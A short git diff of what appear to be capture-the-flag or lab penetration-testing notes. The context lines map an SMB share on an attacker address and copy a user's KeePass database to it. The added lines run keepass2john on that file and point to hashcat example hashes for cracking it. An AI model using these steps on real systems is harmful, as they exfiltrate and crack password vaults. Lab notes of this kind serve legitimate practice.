@@ -47,6 +47,10 @@ New-PSDrive -Name "FollowMe" -PSProvider "FileSystem" -Root "\\10.10.14.11\TRY"
 cd FollowMe:
 cp C:\Users\kohsuke\Documents\CEH.kdbx .
 
+keepass2john CEH.kdbx
+cp result like:
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
 
 
 
